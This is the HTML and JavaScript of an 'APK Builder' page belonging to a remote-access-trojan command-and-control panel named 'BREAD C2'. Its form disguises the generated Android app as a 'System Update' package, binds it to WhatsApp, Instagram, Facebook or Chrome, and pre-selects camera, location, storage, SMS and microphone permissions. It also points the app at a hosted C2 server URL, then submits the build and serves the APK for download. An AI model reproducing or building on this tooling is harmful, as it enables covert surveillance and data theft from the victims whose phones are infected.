<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BREAD C2 - APK Builder</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-2 sidebar">
                <h4 class="text-glow"><i class="bi bi-cpu"></i> BREAD C2</h4>
                <nav class="nav flex-column">
                    <a class="nav-link" href="panel.html"><i class="bi bi-grid"></i> Dashboard</a>
                    <a class="nav-link" href="target.html"><i class="bi bi-phone"></i> Targets</a>
                    <a class="nav-link" href="commands.html"><i class="bi bi-terminal"></i> Commands</a>
                    <a class="nav-link" href="logs.html"><i class="bi bi-file-earmark-text"></i> Logs</a>
                    <a class="nav-link active" href="builder.html"><i class="bi bi-hammer"></i> APK Builder</a>
                    <a class="nav-link" href="settings.html"><i class="bi bi-gear"></i> Settings</a>
                    <hr style="border-color:#1f2a3a;">
                    <a class="nav-link text-danger" href="#" onclick="logout()"><i class="bi bi-box-arrow-right"></i> Logout</a>
                </nav>
            </div>
            <!-- Main Content -->
            <div class="col-md-10 p-4">
                <h3><i class="bi bi-hammer text-glow"></i> APK Builder</h3>
                <p>Buat APK RAT tanpa sentuh Android Studio. Isi form di bawah, klik build, dan unduh APK-nya.</p>

                <div class="card mt-3">
                    <div class="card-body">
                        <form id="buildForm" enctype="multipart/form-data">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label class="form-label">Nama Aplikasi</label>
                                        <input type="text" class="form-control" id="appName" value="System Update" required>
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">Nama Paket (Package Name)</label>
                                        <input type="text" class="form-control" id="packageName" value="com.android.systemupdate" required>
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">URL Server C2 (Backend Railway)</label>
                                        <input type="url" class="form-control" id="c2Url" value="https://project-production-82c9.up.railway.app" required>
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">Aplikasi Target Binding</label>
                                        <select class="form-select" id="bindTarget">
                                            <option value="whatsapp">WhatsApp</option>
                                            <option value="instagram">Instagram</option>
                                            <option value="facebook">Facebook</option>
                                            <option value="chrome">Google Chrome</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="mb-3">
                                        <label class="form-label">Upload Ikon (PNG, 512x512)</label>
                                        <input type="file" class="form-control" id="iconFile" accept="image/png">
                                        <div id="iconPreview" class="mt-2"></div>
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">Izin (Permissions)</label>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="permCamera" checked>
                                            <label class="form-check-label">Camera</label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="permLocation" checked>
                                            <label class="form-check-label">Location</label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="permStorage" checked>
                                            <label class="form-check-label">Storage</label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="permSms" checked>
                                            <label class="form-check-label">Read SMS</label>
                                        </div>
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" id="permMic" checked>
                                            <label class="form-check-label">Microphone</label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary" id="buildBtn">
                                <i class="bi bi-hammer"></i> Build APK
                            </button>
                        </form>
                        <div id="buildStatus" class="mt-3" style="display:none;">
                            <div class="progress">
                                <div class="progress-bar progress-bar-striped progress-bar-animated" id="buildProgress" style="width:0%"></div>
                            </div>
                            <p id="buildMessage" class="mt-2">Memulai build...</p>
                        </div>
                        <div id="downloadSection" class="mt-3" style="display:none;">
                            <a href="#" id="downloadLink" class="btn btn-success"><i class="bi bi-download"></i> Download APK</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="module">
        import { API_BASE } from './js/config.js';
        const token = localStorage.getItem('token');
        if (!token) window.location.replace('index.html');
	console.log('🔹 Builder loaded, token:', token);
	if (!token) {
	    console.log('❌ No token, redirect to login');
	    window.location.replace('index.html');
	} else {
	    console.log('✅ Token found, builder ready');
	}

        window.logout = function() {
            localStorage.removeItem('token');
            localStorage.removeItem('api_base');
            window.location.replace('index.html');
        };

        // Preview icon upload
        document.getElementById('iconFile').addEventListener('change', function(e) {
            const reader = new FileReader();
            reader.onload = function(event) {
                const img = document.createElement('img');
                img.src = event.target.result;
                img.style.maxWidth = '100px';
                img.style.maxHeight = '100px';
                const preview = document.getElementById('iconPreview');
                preview.innerHTML = '';
                preview.appendChild(img);
            };
            reader.readAsDataURL(e.target.files[0]);
        });

        // Form submission
        document.getElementById('buildForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const buildBtn = document.getElementById('buildBtn');
            buildBtn.disabled = true;
            buildBtn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Building...';

            // Collect data
            const formData = new FormData();
            formData.append('appName', document.getElementById('appName').value);
            formData.append('packageName', document.getElementById('packageName').value);
            formData.append('c2Url', document.getElementById('c2Url').value);
            formData.append('bindTarget', document.getElementById('bindTarget').value);
            const iconFile = document.getElementById('iconFile').files[0];
            if (iconFile) {
                formData.append('icon', iconFile);
            }
            const permissions = {
                camera: document.getElementById('permCamera').checked,
                location: document.getElementById('permLocation').checked,
                storage: document.getElementById('permStorage').checked,
                sms: document.getElementById('permSms').checked,
                mic: document.getElementById('permMic').checked
            };
            formData.append('permissions', JSON.stringify(permissions));

            // Show status
            const statusDiv = document.getElementById('buildStatus');
            statusDiv.style.display = 'block';
            const progressBar = document.getElementById('buildProgress');
            const messageEl = document.getElementById('buildMessage');
            progressBar.style.width = '0%';
            messageEl.innerText = 'Mengirim data ke server...';

            try {
                // 1. Kirim request build ke backend
                const res = await fetch(API_BASE + '/api/build-apk', {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${token}` },
                    body: formData
                });
                const data = await res.json();
                if (!res.ok) throw new Error(data.error || 'Build failed');

                const buildId = data.buildId;
                messageEl.innerText = 'Build dimulai, memantau progress...';

                // 2. Polling status build
                let progress = 0;
                const interval = setInterval(async () => {
                    try {
                        const statusRes = await fetch(API_BASE + `/api/build-status/${buildId}`, {
                            headers: { 'Authorization': `Bearer ${token}` }
                        });
                        const statusData = await statusRes.json();
                        if (statusData.status === 'building') {
                            progress = Math.min(progress + 10, 90);
                            progressBar.style.width = progress + '%';
                            messageEl.innerText = statusData.message || 'Building...';
                        } else if (statusData.status === 'success') {
                            clearInterval(interval);
                            progressBar.style.width = '100%';
                            messageEl.innerText = '✅ Build selesai! APK siap diunduh.';
                            document.getElementById('downloadSection').style.display = 'block';
                            document.getElementById('downloadLink').href = statusData.downloadUrl;
                            buildBtn.disabled = false;
                            buildBtn.innerHTML = '<i class="bi bi-hammer"></i> Build APK';
                        } else if (statusData.status === 'failed') {
                            clearInterval(interval);
                            progressBar.style.width = '100%';
                            progressBar.className = 'progress-bar bg-danger';
                            messageEl.innerText = '❌ Build gagal: ' + (statusData.error || 'Unknown error');
                            buildBtn.disabled = false;
                            buildBtn.innerHTML = '<i class="bi bi-hammer"></i> Build APK';
                        }
                    } catch (e) {
                        console.error('Polling error:', e);
                    }
                }, 3000);

            } catch (err) {
                console.error('Build error:', err);
                messageEl.innerText = '❌ Error: ' + err.message;
                buildBtn.disabled = false;
                buildBtn.innerHTML = '<i class="bi bi-hammer"></i> Build APK';
            }
        });
    </script>
</body>
</html>
